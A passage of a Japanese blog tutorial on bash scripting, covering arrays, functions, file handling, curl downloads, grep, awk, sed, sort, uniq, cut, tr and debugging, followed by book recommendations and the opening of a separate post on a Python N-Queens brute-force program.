「BMW」が「0」番目のインデックスに格納され、「TOYOTA」が「1」番目のインデックスに格納され、「HONDA」が「2」番目のインデックスに格納されます。\n「BMW」を出力する場合は、${car[0]}と書きます。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39;); echo \u0026#34;${car[@]}\u0026#34;; #printing value by using index echo \u0026#34;printing value using index\u0026#34;; echo \u0026#34;${car[0]}\u0026#34;; echo \u0026#34;${car[1]}\u0026#34;; echo \u0026#34;${car[2]}\u0026#34;; $ bash array2.sh BMW TOYOTA HONDA printing value using index BMW TOYOTA HONDA $ 配列のインデックスを印刷することもできます。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39;); echo \u0026#34;${car[@]}\u0026#34;; echo \u0026#34;printing the indexes\u0026#34;; echo \u0026#34;${!car[@]}\u0026#34;; $ bash array3.sh BMW TOYOTA HONDA printing the indexes 0 1 2 $ 配列内の値の合計数を印刷する場合は、ここに「${#car[@]}」と書くだけで、要素の総数を表します。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39; \u0026#39;ROVER\u0026#39;); echo \u0026#34;${car[@]}\u0026#34;; echo \u0026#34;printing the indexes\u0026#34;; echo \u0026#34;${!car[@]}\u0026#34;; echo \u0026#34;printing number of values\u0026#34;; echo \u0026#34;${#car[@]}\u0026#34;; $ bash array4.sh BMW TOYOTA HONDA ROVER printing the indexes 0 1 2 3 printing number of values 4 $ 配列内にある任意の要素を削除したいとします。\n要素を削除するには、配列名と削除する要素のインデックスを含む「unset」コマンドを使用します。\n「car」配列の2番目のインデックスに格納されている値を削除する場合は、スクリプトに「unset car[2]」と書くだけです。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39; \u0026#39;ROVER\u0026#39;) unset car[2] echo \u0026#34;${car[@]}\u0026#34; echo \u0026#34;printing the indexes\u0026#34; echo \u0026#34;${!car[@]}\u0026#34; echo \u0026#34;printing number of values\u0026#34; echo \u0026#34;${#car[@]}\u0026#34; 次のコードを「helloScript.sh」に保存します。「./helloScript.sh」を使用してファイルを実行します。\n配列要素を削除することはわかりました。\nでは「MERCEDES」などの他の値をインデックス2に格納する場合はどうしましょう。\nunsetコマンドを使用した後、次の行に「car[2]=\u0026lsquo;MERCEDES」と書きます。\n#!/bin/bash car=(\u0026#39;BMW\u0026#39; \u0026#39;TOYOTA\u0026#39; \u0026#39;HONDA\u0026#39; \u0026#39;ROVER\u0026#39;) # 2のHONDAを削除 unset car[2] # 2に値をセット car[2]=\u0026#39;MERCEDES\u0026#39; echo \u0026#34;${car[@]}\u0026#34; echo \u0026#34;printing the indexes\u0026#34; echo \u0026#34;${!car[@]}\u0026#34; echo \u0026#34;printing number of values\u0026#34; echo \u0026#34;${#car[@]}\u0026#34; $ bash array5.sh BMW TOYOTA MERCEDES ROVER printing the indexes 0 1 2 3 printing number of values 4 $ 関数 関数は基本的に再利用可能なコード行です。何度も呼び出すことができます。\n特定の操作を何度も実行する場合、または特定の処理を何度も実行する場合、関数は、何度も何度も同じコードを書くための時間と労力を軽減します。\n以下は関数の構文を示す例です。\n覚えておくべき最も重要なことの1つは、関数を呼び出す前にコーディングのどこかで最初に関数を定義または宣言する必要があることです。\nコードで関数を定義するには、３つのステップが必要です。\nステップ1は、指定する関数名の前に「function」コマンドを書き関数名を宣言し、後ろに「()」を書きます。\nステップ2は、処理ブロックは「{」ではじまり、「 }」で閉じられた内側ににコードを書くことです。\nステップ3は、function 関数名() で宣言した下の行で実行したい関数名を使用して関数を呼び出すことです。\n#!/bin/bash # 関数の宣言 function funcName(){ echo \u0026#34;this is new function\u0026#34;; } # 関数呼び出し funcName; $ bash method.sh this is new function $ 関数にパラメータを与えることもできます。\nたとえば、関数呼び出し時に与えられる任意の単語を引数として指定します。\n関数呼び出しの関数名の後ろに、文字列を指定して関数に渡します。\n渡された関数は、一つ目のパラメータを $1 として処理を続ける事ができます。\n#!/bin/bash function funcPrint(){ echo \u0026#34;$1\u0026#34;; } funcPrint \u0026#34;BashScript\u0026#34;; $ bash method2.sh BashScript $ 複数のパラメータを扱う場合、$1, $2などの変数名は区別がつきにくく、コードが混乱する場合が多いので、変数に代入すると、扱いやすくなります。\n#!/bin/bash function funcPrint(){ name=\u0026#34;$1\u0026#34;; age=\u0026#34;$2\u0026#34;; echo \u0026#34;$name is $age years old.\u0026#34;; } funcPrint \u0026#34;BashScript\u0026#34; 24 ; $ bash method2.sh BashScript is 24 years old. $ 関数内で宣言される変数はローカル変数です。 というのは一般的なプログラム言語ですが、シェルスクリプトBashはグローバル変数しかありません。関数の中で宣言しても、関数の外で宣言しても、いずれもグローバル変数です。 先に紹介した declare -g を使うことにより、グローバル変数とローカル変数を明確に区別することができます。 例えば、以下のソースでは、関数実行前に「I love Mac」を変数に格納し、出力します。 その後、関数を呼び出し、同変数に「I love Linux」を変数に代入すると、Ｃ言語やＪａｖａなどは、ローカル変数に格納した値は、グローバル変数に影響しない訳ですが、シェルスクリプトBashは、もろに影響します。理由は全てグローバル扱いだからです。 ``` bash:global_local.sh #!/bin/bash function funcCheck(){ returningValue=\u0026#34;I love Linux\u0026#34;; } returningValue=\u0026#34;I love MAC\u0026#34;; echo $returningValue; #\u0026gt; I love Mac funcCheck; echo $returningValue; #\u0026gt; I love Linux $ bash global_local.sh I love MAC I love Linux $ ファイルとディレクトリ このトピックでは、\n１．ファイルとディレクトリを作成する方法、\n２．スクリプトを使用してこれらのファイルとディレクトリの存在を確認する方法、\n３．ファイルからテキストを1行ずつ読み取る方法、\n４．ファイルにテキストを追加する方法、\n５．ファイルを削除する方法、\nを紹介します。\nディレクトリ操作 最初のスクリプトは、「Directory2」という名前のディレクトリを作成します。\n\u0026lsquo;mkdir\u0026rsquo; コマンドでディレクトリを作成します。\nすでに同じディレクトリに「Directory2」フォルダーがある場合はエラーとなります。\nエラーに対処するためには、\u0026rsquo;-p\u0026rsquo; オプションを使います。\n\u0026lsquo;-p\u0026rsquo; オプションは、作成しようとするその場所に、作成したいディレクトリ名が既に存在している場合は、なにもしません。ディレクトリが存在しない場合のみ、新しいディレクトリを作成します。\n#!/bin/bash mkdir -p Directory2 現在の場所にディレクトリが存在するかどうかをif文で確認することもできます。\n「if」ステートメントでディレクトリが存在するかどうかをチェックするためにはif文の条件式で「-d」フラグを使用します。\n#!/bin/bash echo \u0026#34;enter directory name to check\u0026#34;; read direct; if [ -d \u0026#34;$direct\u0026#34; ]; then echo \u0026#34;$direct exists\u0026#34; else echo \u0026#34;$direct doesn\u0026#39;t exist\u0026#34; fi ファイル操作 ファイルの作成には「touch」コマンドを使います。\nヒント ディレクトリの作成には \u0026lsquo;mkdir\u0026rsquo; コマンド、 ファイルの作成には \u0026rsquo;touch\u0026rsquo; コマンドを使います。 #!/bin/bash echo \u0026#34;enter file name to create\u0026#34;; read fileName; touch $fileName; touchコマンドはmkdirコマンド同様、ファイルを作成しようとするその場所に、既に作成しようとするファイル明度同名のファイルが存在した場合、何もしません。\nmkdir は、ディレクトリを作成する。同名のディレクトリがあればエラーとなります。\nls directory2/ $ mkdir directory2 mkdir: directory2: File exists $ そこで、mkdir -p コマンドは、同名のディレクトリが既にあればエラーを返さず何もしない。なければディレクトリを作成。\ntouchコマンドも同様で、同名のファイルが既にあればエラーを返さず何もせず、なければファイルを作成します。\nヒント touchコマンドは既に同名のファイルがあれば、エラーを返さない代わりに何もしませんが、「:\u0026gt;」コマンドでファイルを作成した場合、既に作成しようとするその場所に同名のファイルがあった場合、空の新規ファイルで上書きします。（ですので、ファイルは強制的に作成されますが、データ内容は消滅します。 if文で -d フラグでディレクトリの存在を確認する事ができました。\nファイルも同様に -f フラグでファイルの存在を確認する事ができます。\n#!/bin/bash echo \u0026#34;enter file name to check\u0026#34;; read fileName; if [ -f \u0026#34;$fileName\u0026#34; ]; then; echo \u0026#34;$fileName exists\u0026#34;; else echo \u0026#34;$fileName doesn\u0026#39;t exist\u0026#34;; fi テキストへのファイル出力 ファイルにテキストを追加するには、「\u0026gt;」リダイレクト、または「\u0026raquo;」アペンドを使います。\n「\u0026gt;」リダイレクトは、ファイルを新規に作成し直してから出力します。\n「\u0026raquo;」アペンドは、既にファイルが存在しているときに限定して出力します。\nヒント 「\u0026gt;」リダイレクトは、既にファイルが存在している場合も、ファイルを新規作成します。ですので、元々あったファイルの内容は空になります。からになってもらっては困ると言う場合は、「touch」コマンドを使います。 また、「\u0026raquo;」アペンドは、追記する場合に、ファイルがない場合はエラーとなります。こうした事にならないように、次の例文で、ファイルの存在を確認して処理を進めます。\n#!/bin/bash echo \u0026#34;入力ファイル名を指定して下さい\u0026#34;; read fileName; echo \u0026#34;ファイルに追記したい文字列を入力して下さい\u0026#34;; read fileText; # ファイルがあれば if [ -f \u0026#34;$fileName\u0026#34; ]; then # アペンド echo \u0026#34;アペンドします\u0026#34;; echo \u0026#34;$fileText\u0026#34; \u0026gt;\u0026gt; $fileName else # リダイレクト echo \u0026#34;リダイレクトします\u0026#34;; echo \u0026#34;$fileText\u0026#34; \u0026gt; $fileName fi ファイルの読み込み スクリプトを使用して任意のファイルを読み取ることもできます。上記の方法に従ってファイルを見つけます。その後、while条件を使用して「read -r line」を使用してファイルを読み取る。ファイルを読み取るので、このシンボル「\u0026lt;」を使用します。\necho \u0026#34;読み込みたいファイル名を指定して下さい\u0026#34;; read fileName; # ファイルがあれば if [ -f \u0026#34;$fileName\u0026#34; ]; then # 読み込む while read line; do echo \u0026#34;$line\u0026#34;; done\u0026lt;$fileName else echo \u0026#34;$fileName は存在しません\u0026#34;; fi ファイルを削除するには、まずファイルが存在するかどうかを調べることです。\n#!/bin/bash echo \u0026#34;enter file name from which you want to delete\u0026#34;; read fileName; if [ -f \u0026#34;$fileName\u0026#34; ]; then rm $fileName; else echo \u0026#34;$fileName doesn\u0026#39;t exist\u0026#34;; fi ヒント rmコマンドは非常に危険なコマンドです。 ファイルの削除の都度確認を促す -i オプションをつけるなどをするとよいでしょう。 rmコマンドは、ファイルだけではなくディレクトリも削除できます。 再帰的に行いたい場合は、-r オプションをつけると良いです。 curlコマンド カールは、URL構文を持つデータファイルを取得、または送信するためのコマンドです。\nまず最初にしなければならないことはcurlをインストールすることです。\n# 確認 which curl /usr/bin/curl $ ない場合、\n# macの場合 $ sudo brew install curl # linuxの場合 $ yum install curl curlをインストールした後、URLを使ってファイルをダウンロードするためのコードを記述します。\ncurlを使用してデータファイルをダウンロードするには２つのステップが必要です。\n１つ目は、そのファイルの完全なリンクアドレスを持つことです。\n２つ目は、そのアドレスをスクリプトの「url」変数に保存し、そのURLでcurlコマンドを使用してダウンロードすることです。ここで「-O」は、ダウンロードするファイル名は、実在のファイル名を継承すると言う意味となります。\n#!/bin/bash url=\u0026#34;http://www.ovh.net/files/1Mb.dat\u0026#34;; curl ${url} -O; ダウンロードしたファイルに新しい名前を与えるには、「-o」オプションでファイル名を指定します。\n#!/bin/bash url=\u0026#34;http://www.ovh.net/files/1Mb.dat\u0026#34;; curl ${url} -o NewFileDownload; 数百ギガバイトのサイズのファイルをダウンロードしたい場合はどうでしょう。\n適切なファイルをダウンロードしているかどうかを確認するためにヘッダーファイルをダウンロードすることができます。\nファイルのURLの前に「-I」と書くだけです。\n#!/bin/bash url=\u0026#34;http://www.ovh.net/files/1Mb.dat\u0026#34;; curl -I ${url}; selectコマンド selectコマンドは、列挙したリストを表示させ、ユーザーに入力を促します。\n#!/bin/bash select car in BMW MERCEDES TESLA ROVER TOYOTA; do echo \u0026#34;you have selected $car\u0026#34;; done $ bash select.sh 1) BMW\t3) TESLA\t5) TOYOTA 2) MERCEDES 4) ROVER #? 3 you have selected TESLA #? 4 you have selected ROVER #? この場合、選択した車のオプションが表示されますが、オプション以外の番号を入力すると何もしません。\n以下の例では、swich-caseを使用して、ユーザーが他の車のオプションを入力した場合、「1から5の間で選択してください」というエラーメッセージが表示されます。\n#!/bin/bash select car in BMW MERCEDES TESLA ROVER TOYOTA; do case $car in BMW) echo \u0026#34;BMW SELECTED\u0026#34;;; MERCEDES) echo \u0026#34;MERCEDES SELECTED\u0026#34;;; TESLA) echo \u0026#34;TESLA SELECTED\u0026#34;;; ROVER) echo \u0026#34;ROVER SELECTED\u0026#34;;; TOYOTA) echo \u0026#34;TOYOTA SELECTED\u0026#34;;; *) echo \u0026#34;ERROR! Please select between 1 to 5\u0026#34;;; esac done プロのメニューでは、プログラムはユーザーの入力を待つ必要があります。\nこのスクリプトでは、ユーザーに「続行するには任意のキーを押して」ように依頼し、「read -t 3 -n 1」コマンドを使用して3秒ごとにユーザーに「キーSirを押すのを待っています」というリマインダーを送信します。\n#!/bin/bash echo \u0026#34;press any key to continue\u0026#34;; while [ true ]; do # ３秒ごとに入力を促す read -t 3 -n 1; if [ $? = 0 ]; then echo \u0026#34;you have terminated the script\u0026#34;; exit; else echo \u0026#34;waiting for you to press the key Sir\u0026#34; fi done inotifyコマンド ファイルの変更を監視する inotifyを使用してファイルを変更を監視するする方法を説明します。\ninotifyの正式名称は「inode notify」です。\ninotifyは、ファイルシステムの変更を監視し、、変更をアプリケーションに報告するLinuxカーネルサブシステムです。inotifyを操作するには、まずターミナルからinotifyをインストールする必要があります。\nLinuxの場合\n$ yum install inotify-tools inotifyがどのように反応するかを確認します。\n#!/bin/bash mkdir -p iNotifyTest inotifywait -m iNotifyTest では、ターミナルの出力を確認します。\nターミナルをもう一つ起動して上記スクリプトを実行しているターミナルと並べて開きます。\nモニターとしてのinotify.shの動作を見ながら別のターミナルウィンドウを開き、「$ touch file1.txt」でファイルを作成すると、inotifyが反応し、ファイルシステムで現在起こっているすべてのアクションを監視していることがわかります。\n次に「file1.txt」に何かを書き、inotifyで動作するターミナルウィンドウからの応答を確認してください。\ngrepコマンド grepコマンドについてはここで詳しく書きました。\n【 grep 特集】「ざっくりわかるシェルスクリプト４」\nそれはそれとして、ここではざっくりと説明します。\ngrepは ‘global regular expression print’ の略です。\nこのコマンドは、テキストを1行ずつ処理してファイル内のパターンを検索するために使用されます。\nまず、touchコマンドを使用してfilegrep.txtという名前のファイルを作成します。ターミナルに次のコードを入力します。\n$ touch filegrep.txt $ vim filegrep.txt filegrep.txtを開き、ファイルに次のコンテンツを書き込みます。\nThis is Linux This is Windows This is MAC This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC #!/bin/bash echo \u0026#34;検索したいファイル名を指定して下さい。\u0026#34; # 入力を grepfile.txt read fileName if [[ -f \u0026#34;$fileName\u0026#34; ]]; then echo \u0026#34;検索したい語句を入力して下さい。\u0026#34;; read grepvar; grep \u0026#34;$grepvar\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34; fi $ bash test 検索したいファイル名を指定して下さい。 grepfile.txt 検索したい語句を入力して下さい。 linux $ 入力は「linux」（小文字のエル）ですが、ファイル内のテキストは「Linux」（大文字のエル）で書かれているため、検索結果には何も表示されません。ここでは、grepコマンドに「-i」のフラグを追加するだけで、この大文字と小文字を区別する問題に対処する必要があります。\n#!/bin/bash echo \u0026#34;検索したいファイル名を指定して下さい。\u0026#34; # 入力を grepfile.txt read fileName if [[ -f \u0026#34;$fileName\u0026#34; ]]; then echo \u0026#34;検索したい語句を入力して下さい。\u0026#34;; read grepvar; # 大文字小文字の区別をしないオプション -i grep -i \u0026#34;$grepvar\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34; fi $ bash grep2.sh 検索したいファイル名を指定して下さい。 grepfile.txt 検索したい語句を入力して下さい。 linux This is Linux This is Linux This is Linux This is Linux $ 出力で行番号を抽出することもできます。このためには、grepコマンドに「-n」の別のフラグを追加するだけです。\n#!/bin/bash echo \u0026#34;検索したいファイル名を指定して下さい。\u0026#34; # 入力を grepfile.txt read fileName if [[ -f \u0026#34;$fileName\u0026#34; ]]; then echo \u0026#34;検索したい語句を入力して下さい。\u0026#34;; read grepvar; # 大文字小文字の区別をしないオプション -i grep -in \u0026#34;$grepvar\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34; fi $ bash grep3.sh 検索したいファイル名を指定して下さい。 grepfile.txt 検索したい語句を入力して下さい。 linux 1:This is Linux 4:This is Linux 7:This is Linux 10:This is Linux $ ドキュメント内の特定の単語の発生回数を取得することもできます。grepコマンド「grep -i -c $grepvar $fileName」に「-c」フラグを追加し、スクリプトを保存し、端末を使用して実行します。\n#!/bin/bash echo \u0026#34;検索したいファイル名を指定して下さい。\u0026#34; # 入力を grepfile.txt read fileName if [[ -f \u0026#34;$fileName\u0026#34; ]]; then echo \u0026#34;検索したい語句を入力して下さい。\u0026#34;; read grepvar; # 大文字小文字の区別をしないオプション -i grep -inc \u0026#34;$grepvar\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34; fi $ bash test 検索したいファイル名を指定して下さい。 grepfile.txt 検索したい語句を入力して下さい。 linux 4 $ awkコマンド awkは、データの操作やレポートの作成に使用されるスクリプト言語です。\nコンパイルを必要とせず、変数、数値関数、文字列関数、論理演算子が使用できます。\n何より処理が高速です。bashよりも高速である場合が多いです。\nこのトピックでは、シェルスクリプトで多く多用されるawkコマンドの一例を紹介します。\n$ cat grepfile.txt | awk \u0026#39;{ print; }\u0026#39;; This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC This is Linux This is Windows This is MAC $ 「awk」を使用して特定のパターンを検索することもできます。\n$ cat grepfile.txt | awk \u0026#39;/Linux/ { print; }\u0026#39;; This is Linux This is Linux This is Linux This is Linux $ 次の例では、プログラムがターゲットワードを見つけた行からコンテンツを抽出する方法を見ていきます。 「$1」はその行の最初の単語を表し、同様に「$2」は2番目を表し、「$3」は3番目の単語を表し、「$4」はこの場合最後の単語を表します。\n$ cat grepfile.txt | awk \u0026#39;/Linux/ { print $3; }\u0026#39;; Linux Linux Linux Linux $ ヒント awkはとても優れたプログラミング言語で、シェル薬婦とを学ぶことと同じほどのボリュームのある言語です。ただ、シェルスクリプトで使われる多くのbashコマンドを使いこなすことで、awkでないとできないことは限られます。まずはこのトピックで使われるawkコマンドの利用例を身につければオッケーです。すこしずつ覚えていくことを増やしていけばよいのです。 sedコマンド sedコマンドはストリームエディタの略で、標準入力またはファイルからのテキストの編集操作を実行します。\nこのトピックでは「i」を「I」に置き換えます。\nそのためには、次の sed コマンド \u0026lsquo;cat grepfile.txt | sed -e \u0026rsquo;s/i/I/\u0026rsquo; と書くだけで、cat コマンドを使用してファイルの内容を取得し、パイプ \u0026lsquo;|\u0026rsquo; 記号の後に、\u0026lsquo;sed\u0026rsquo; キーワードを使用して、このケースを置き換える操作を指定します。\n「s」はスラッシュと置き換えると言う意味です。\n「-e」はsed コマンドを連続してフィルタリングすることを可能とするオプションです。\n/置き換え前/置き換え後/\nとなります。\n$ cat grepfile.txt | sed -e \u0026#34;s/i/I/\u0026#34; ThIs is Linux ThIs is Windows ThIs is MAC ThIs is Linux ThIs is Windows ThIs is MAC ThIs is Linux ThIs is Windows ThIs is MAC ThIs is Linux ThIs is Windows ThIs is MAC $ 最初に出てくる \u0026lsquo;This is Linux\u0026rsquo; が \u0026lsquo;ThIs is Linux\u0026rsquo; となったことが解ります。\n-g オプションを末尾につけることで、複数回の処理で置き換えます。\n$ cat grepfile.txt | sed -e \u0026#34;s/i/I/g\u0026#34; ThIs Is LInux ThIs Is WIndows ThIs Is MAC ThIs Is LInux ThIs Is WIndows ThIs Is MAC ThIs Is LInux ThIs Is WIndows ThIs Is MAC ThIs Is LInux ThIs Is WIndows ThIs Is MAC $ 以下のコマンドで、処理結果を簡単にファイルに出力して、エディターなどで開いて確認する事ができます。\ncat filegrep.txt | sed -e \u0026#39;s/i/I/g\u0026#39; \u0026gt; newfile.txt 単語全体を別の単語に置き換えることもできます。たとえば、以下に示すスクリプトでは、「Linux」のすべてのインスタンスが端末に表示中に「Unix」に置き換えられます。\n$ cat grepfile.txt | sed -e \u0026#34;s/Linux/Unix/g\u0026#34; This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC $ sortコマンド テキストファイルを行単位で並べ替える\nsort 並べ替える\nsort -n 数値扱いで並べ替える\nsort -r 逆順で出力\nまずは以下の読み込み用サンプルファイルを準備します。\nname:ヤムチャ skill:狼牙風風拳 name:孫悟空 skill:かめはめ波 name:ピッコロ skill:魔貫光殺砲 name:ヤムチャ skill:繰気弾 name:孫悟空 skill:元気玉 name:クリリン skill:気円斬 name:ヤムチャ skill:かめはめ波 name:クリリン skill:かめはめ波 name:孫悟空 skill:ジャン拳 name:ヤムチャ skill:新狼牙風風拳 $ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort name:孫悟空 name:孫悟空 name:孫悟空 name:クリリン name:クリリン name:ピッコロ name:ヤムチャ name:ヤムチャ name:ヤムチャ name:ヤムチャ 解説\ngrep -E\n検索に「拡張正規表現」を使えるようにする。\n^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3} でIPアドレスに一致させる。\ngrep -o\n通常の grep では一致した行全体が表示されるが、-o を指定することにより一致した文字のみを表示させることができる。\nsort\n次の uniq で重複行のカウントを行うため、並び替える。\nuniqコマンド uniq -c\n重複行のカウントを表示する。\n$ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort | uniq -c 3 name:孫悟空 2 name:クリリン 1 name:ピッコロ 4 name:ヤムチャ $ sort -r 逆順 sort -r\nカウントの降順で並べ替える。\n$ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort | uniq -c | sort -r 4 name:ヤムチャ 3 name:孫悟空 2 name:クリリン 1 name:ピッコロ cutコマンド cut:タブ区切りでフィールドを選択して出力する\ncut -d:デリミタを指定。いわゆる区切り文字\ncut -f:抽出するフィールドの番号を指定する。上記コマンドで1を指定した場合は二つ目の\u0026quot;name\u0026quot;が抽出される。\n$ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort | uniq -c | sort -r | cut -d \u0026#34;:\u0026#34; -f2 ヤムチャ 孫悟空 クリリン ピッコロ $ headコマンド 長いメッセージやテキストファイルの先頭だけ／末尾だけを表示する\nhead -n\nn: 出力する行数を指定する。\n$ cat sample.txt | grep -o \u0026#34;name:\\S*\u0026#34; | sort | uniq -c | sort -r | cut -d \u0026#34;:\u0026#34; -f2 | head -n2 ヤムチャ 孫悟空 $ trコマンド テキストファイルの文字を置換する／削除する\n「-d」オプションで、指定した文字を削除することができます。例えば、Windows環境で作成したテキストファイルの改行コードを、Linux環境向けに置き換えるといった用途に使用できます。\n$ cat sample.txt name:ヤムチャ skill:狼牙風風拳 name:孫悟空 skill:かめはめ波 name:ピッコロ skill:魔貫光殺砲 name:ヤムチャ skill:繰気弾 name:孫悟空 skill:元気玉 name:クリリン skill:気円斬 name:ヤムチャ skill:かめはめ波 name:クリリン skill:かめはめ波 name:孫悟空 skill:ジャン拳 name:ヤムチャ skill:新狼牙風風拳 $ cat sample.txt | tr -d \u0026#39;\\n\u0026#39; name:ヤムチャ skill:狼牙風風拳name:孫悟空 skill:かめはめ波name:ピッコロ skill:魔貫光殺砲name:ヤムチャ skill:繰気弾name:孫悟空 skill:元気玉name:クリリン skill:気円斬name:ヤムチャ skill:かめはめ波name:クリリン skill:かめはめ波name:孫悟空 skill:ジャン拳name:ヤムチャ skill:新狼牙風風拳 $ Windows環境では、改行を「CR」（16進数0D）と「LF」（16進数0A）の2バイトで表しますが、Linux環境では「LF」のみです。trコマンドでは「CR」を「\\r」で表すことができるので、「tr -d \\r」としてテキストファイルから「CR」を除去することで、Linux環境用の改行コードに変換できます。\n「-s」オプションでは、指定した文字が連続している場合には1つにまとめることができます。例えば、「tr -s \u0026ldquo;\\r\u0026rdquo;」では、連続した改行を1つにします。catコマンドの「-s」オプションと同じ働きになります。\nヒント trコマンドの \u0026lsquo;\\n\u0026rsquo; はシングルクォーテーションで囲む必要があります。 スクリプトのデバッグ Bashは広範なデバッグ機能を提供しています。\nデバッグの方法は３種類あります\n１．ターミナルの実行時に -x オプションを付与する\n$ bash -x helloScript.sh ２．ソースコードの冒頭のシェバンに -x オプションを付与する\n#!/bin/bash -x : : ３．デバッグの開始点と終了点を決めてデバッグ\nデバッグの開始点にコマンド \u0026lsquo;set -x\u0026rsquo;終了点には \u0026lsquo;set +x\u0026rsquo; と書きます。\n#!/bin/bash set -x echo \u0026#34;置き換えたいファイル名を入寮して下さい。\u0026#34; read fileName set +x if [[ -f \u0026#34;$fileName\u0026#34; ]]; then sed -e \u0026#34;s/Linux/Unix/g\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34;; fi $ bash test + echo 置き換えたいファイル名を入寮して下さい。 置き換えたいファイル名を入寮して下さい。 + read fileName grepfile.txt + set +x This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC $ #!/bin/bash # デバッグ開始 set -x var1=`date +%M` # デバッグ終了 set +x var2=`ls -1 | wc -l` var3=\u0026#34;DEBUG TEST\u0026#34; exit 0 $ bash debug3.sh ++ date +%M + var1=56 + set +x $ ヒント だいたい解ってきたのではないかと思います。 要するにシェルスクリプトは「｜パイプ」で繋いで連続する処理をフィルタリングして、目的の結果に近づけていくというものです。 関数を使って、より長く複雑なことも実行可能です。 Linux(CUI)でできることはすべてシェルスクリプトでできます。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-02T15:55:47+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/","title":"【grep/sed/awkも】ざっくりわかるシェルスクリプト５」"},{"content":"グローバル変数 今回は、前回からの引き続きでブルートフォース力任せ探索のプログラムの詳細部分を説明します。\nプログラムのソースは以下のURLをご覧ください。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py01_nqueen.py\nまず、グローバル変数を見ていきましょう。\n417~420行目で設定しています。\n417行目 MAX、418行目 SIZEでNの数を指定します。\nプログラムは8ですが、動作を説明するために4に変更してみてください。\nMAX = 4 SIZE = 4 以降はN=4の問題として説明します。\n419行目 ABOARDという配列を宣言しクイーンを置いていきます。\nABOARD = [0 for i in range(MAX)]で4個の要素を0で初期化しています。\nABOARD = [0,0,0,0] 